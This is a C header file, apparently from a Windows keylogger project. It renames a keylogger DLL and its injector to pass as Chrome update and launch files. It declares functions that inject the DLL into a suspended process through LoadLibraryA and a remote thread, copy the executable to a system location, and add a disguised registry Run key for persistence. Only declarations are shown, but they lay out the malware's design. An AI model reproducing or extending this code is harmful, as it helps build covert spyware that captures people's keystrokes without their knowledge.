#ifndef INJECTOR_H
#define INJECTOR_H

#include <windows.h>
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <direct.h>
#include <string.h>

#define LOGFILE "log.txt"
#define OLDFILE "injector.exe"
#define NEWFILE "chromeLaunch.exe"
#define OLDDLL "Keylogger.dll"
#define NEWDLL "chromeUpdateChecker.dll"
#define REGISTERY_NAME "ChromeAutoLaunch_9A8B7C6D12E4F9A27B3A7F5C4D9A6B8F2"

/**
 * Creates a suspended process for DLL injection.
 *
 * @param targetPath The path of the target executable.
 * @param ProcessInfo Pointer to a PROCESS_INFORMATION structure to receive process details.
 * @return TRUE if the process was created successfully, FALSE otherwise.
 */
BOOL create_suspended_process(LPCSTR targetPath, PROCESS_INFORMATION *ProcessInfo);

/**
 * Retrieves the handle to kernel32.dll.
 *
 * @return Handle to kernel32.dll, or NULL on failure.
 */
HMODULE get_kernel32_handle();

/**
 * Retrieves the address of LoadLibraryA function.
 *
 * @param kernel32Handle Handle to kernel32.dll.
 * @return Address of LoadLibraryA, or NULL on failure.
 */
FARPROC get_loadlibrary_address(HMODULE kernel32Handle);

/**
 * Allocates memory in the target process for DLL path storage.
 *
 * @param hProcess Handle to the target process.
 * @param libraryPath The DLL path to inject.
 * @return Pointer to allocated memory, or NULL on failure.
 */
LPVOID allocate_memory(HANDLE hProcess, LPCSTR libraryPath);

/**
 * Writes the DLL path into the allocated memory of the target process.
 *
 * @param hProcess Handle to the target process.
 * @param remoteMemory Pointer to the allocated memory.
 * @param libraryPath The DLL path to write.
 * @return TRUE if successful, FALSE otherwise.
 */
BOOL write_memory(HANDLE hProcess, LPVOID remoteMemory, LPCSTR libraryPath);

/**
 * Creates a remote thread in the target process to execute LoadLibraryA with the DLL path.
 *
 * @param hProcess Handle to the target process.
 * @param remoteMemory Pointer to the allocated memory containing the DLL path.
 * @param loadLibraryAddr Address of LoadLibraryA function.
 * @return TRUE if successful, FALSE otherwise.
 */
BOOL create_remote_thread(HANDLE hProcess, LPVOID remoteMemory, FARPROC loadLibraryAddr);

/**
 * Cleans up process handles and resumes execution of the target process.
 *
 * @param ProcessInfo Pointer to a PROCESS_INFORMATION structure.
 */
void cleanup(PROCESS_INFORMATION *ProcessInfo);

/**
 * Creates a directory at the specified target path if it does not already exist.
 *
 * @param targetPath The directory path.
 */
void create_directory(char *targetPath);

/**
 * Copies the executable file to a system location for persistence.
 *
 * @param targetPath The buffer to store the target path.
 */
void copyToSystemLocation(char *targetPath);

/**
 * Sets the registry key for persistence to automatically run the copied executable.
 *
 * @param targetPath The path of the copied executable.
 */
void setRegistryPersistence(const char *targetPath);

/**
 * Performs the persistence operations: copying the file and setting registry.
 */
void persistence();

#endif // INJECTOR_H
